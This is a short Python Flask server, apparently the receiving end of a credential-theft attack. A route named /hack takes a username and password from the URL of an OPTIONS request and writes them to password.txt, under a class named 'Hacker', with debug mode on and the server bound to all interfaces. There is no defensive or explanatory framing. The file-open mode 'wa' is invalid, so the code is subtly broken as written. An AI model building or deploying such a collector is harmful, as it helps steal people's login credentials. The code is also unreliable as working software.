from flask import Flask
from flask_restplus import Resource,Api
from flask_cors import CORS
from gevent.pywsgi import WSGIServer

app = Flask(__name__)
#CORS(app, supports_credentials=True)
api = Api(app)

@api.route('/hack/<string:username>/<string:password>',methods=['OPTIONS'])
class Hacker(Resource):
    def options(self,username, password):
        with open('password.txt', 'wa') as f:
            f.write("username: "+str(username) +  "   password :  " +str(password))
        return 200

if __name__ == '__main__':
    # Debug/Development
    app.run(debug=True, host="0.0.0.0", port=5000)
    # Production
    #http_server = WSGIServer(('0.0.0.0', 5000), api)
    #http_server.serve_forever()


